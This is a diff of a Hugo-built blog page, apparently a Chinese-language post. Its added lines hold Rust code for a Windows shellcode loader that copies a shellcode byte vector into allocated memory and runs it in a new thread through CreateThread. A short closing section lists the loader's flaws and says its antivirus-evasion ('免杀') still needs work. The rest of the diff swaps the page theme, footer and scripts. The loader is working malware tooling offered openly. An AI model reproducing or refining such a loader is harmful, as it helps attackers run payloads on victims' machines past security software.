+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">			</span><span class="mi">0</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="c1">//stack attribute
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">			</span><span class="nb">Some</span><span class="p">(</span><span class="n">ep</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="c1">//pointer to thread func
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">			</span><span class="n">ptr</span>::<span class="n">null_mut</span><span class="p">(),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="c1">//prama to thread func
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">			</span><span class="n">windows</span>::<span class="n">Win32</span>::<span class="n">System</span>::<span class="n">Threading</span>::<span class="n">THREAD_CREATION_FLAGS</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="c1">//thread create flags
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">			</span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">th</span><span class="p">.</span><span class="n">tid</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="c1">//thread id
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">		</span><span class="p">).</span><span class="n">unwrap</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">if</span><span class="w"> </span><span class="n">th</span><span class="p">.</span><span class="n">handle</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">Foundation</span>::<span class="n">HANDLE</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="nb">Err</span><span class="p">(</span><span class="n">Foundation</span>::<span class="n">GetLastError</span><span class="p">())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="nb">Ok</span><span class="p">(</span><span class="n">th</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">wait</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">Result</span><span class="o">&lt;</span><span class="p">(),</span><span class="w"> </span><span class="n">WIN32_ERROR</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="kd">let</span><span class="w"> </span><span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">unsafe</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">Threading</span>::<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">handle</span><span class="p">,</span><span class="w"> </span><span class="n">WindowsProgramming</span>::<span class="n">INFINITE</span><span class="p">)</span><span class="w"> </span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">if</span><span class="w"> </span><span class="n">status</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="nb">Ok</span><span class="p">(())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="nb">Err</span><span class="p">(</span><span class="w"> </span><span class="k">unsafe</span><span class="p">{</span><span class="n">Foundation</span>::<span class="n">GetLastError</span><span class="p">()}</span><span class="w"> </span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">pub</span><span class="w"> </span><span class="k">fn</span> <span class="nf">run</span><span class="p">(</span><span class="n">shellcode</span>: <span class="nb">Vec</span><span class="o">&lt;</span><span class="kt">u8</span><span class="o">&gt;</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">Result</span><span class="o">&lt;</span><span class="p">(),</span><span class="w"> </span><span class="n">WIN32_ERROR</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">me</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DistributeMemory</span>::<span class="n">new</span><span class="p">(</span><span class="n">shellcode</span><span class="p">.</span><span class="n">len</span><span class="p">())</span><span class="o">?</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="kd">let</span><span class="w"> </span><span class="n">ms</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">me</span><span class="p">.</span><span class="n">as_slice_mut</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">ms</span><span class="p">[</span><span class="o">..</span><span class="n">shellcode</span><span class="p">.</span><span class="n">len</span><span class="p">()].</span><span class="n">copy_from_slice</span><span class="p">(</span><span class="n">shellcode</span><span class="p">.</span><span class="n">as_slice</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="kd">let</span><span class="w"> </span><span class="n">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">unsafe</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">Thread</span>::<span class="n">run</span><span class="p">(</span><span class="n">me</span><span class="p">.</span><span class="n">as_ptr</span><span class="p">())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="o">?</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">t</span><span class="p">.</span><span class="n">wait</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><h2 id="0x02-存在的缺陷">0x02 存在的缺陷</h2>
 <p>​	由于使用的是指定成员数量的切片,在main.rs中复制粘贴时必须改变[u8]的数量.</p>
 <p>免杀功能仍须改进</p>
 
-    <h4><a href="https://fumerem.github.io">Back to Home</a></h4>
+  </article>
+
+  <br/>
+
+  
+  
+</section>
+
+      </div>
+      
+        <footer class="footer">
+  <section class="container">
+    
+    
+     © 2022    ·  Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/naro143/hugo-coder-portfolio">CoderPortfolio</a>. 
+
+  </section>
+</footer>
+<div class="fixed-bar">
+  <section class="container">
+    
+      <p id="privateTriggerText">Do you want to find something usable?<a id="privateTrigger">Click!</a></p>
+    
+    
+  </section>
 </div>
 
-
-        </div><footer class="container">
-    <hr class="soften">
-    <p>
-
-    <a href="https://gitlab.com/maxlefou/hugo.386">hugo.386 theme by Max le Fou</a> | 
-
-&copy; 
-<a href="http://jmf-portfolio.netlify.com" target="_blank">
-    Fumerem
-</a>
-<span id="thisyear">2020</span>
-
-
-        | <a href="//gohugo.io" target="_blank">Hugo</a>Built on
-
-</p>
-    <p class="text-center">
-        
-        
-        
-        <a href="https://github.com">GitHub</a> 
-        
-    </p>
-</footer>
-
-</body><link rel="stylesheet" href="/css/bootstrap.css">
-<link rel="stylesheet" href="/css/bootstrap-responsive.css">
-<link rel="stylesheet" href="/css/style.css">
-
-<script src="/js/jquery.js"></script>
-<script src="/js/bootstrap-386.js"></script>
-<script src="/js/bootstrap-transition.js"></script>
-<script src="/js/bootstrap-alert.js"></script>
-<script src="/js/bootstrap-modal.js"></script>
-<script src="/js/bootstrap-dropdown.js"></script>
-<script src="/js/bootstrap-scrollspy.js"></script>
-<script src="/js/bootstrap-tab.js"></script>
-<script src="/js/bootstrap-tooltip.js"></script>
-<script src="/js/bootstrap-popover.js"></script>
-<script src="/js/bootstrap-button.js"></script>
-<script src="/js/bootstrap-collapse.js"></script>
-<script src="/js/bootstrap-carousel.js"></script>
-<script src="/js/bootstrap-typeahead.js"></script>
-<script src="/js/bootstrap-affix.js"></script>
-<script>
-    _386 = { 
-        fastLoad: false ,
-        onePass: false , 
-        speedFactor: 1 
-    };
+      
+    </main>
 
     
-    function ThisYear() {
-        document.getElementById('thisyear').innerHTML = new Date().getFullYear();
-    };
-</script></html>
+
+  <script src="/js/app.js"></script>
+  
+  <script>
+  (function($) {
+    $(function() {
+      $('#privateTrigger').on('click', function() {
+        $('.private').slideToggle();
+        $('#privateTriggerText').text("No, I have no value for you to seek.");
+      });
+    });
+   })(jQuery);
+  </script>
+  
+  </body>
+</html>
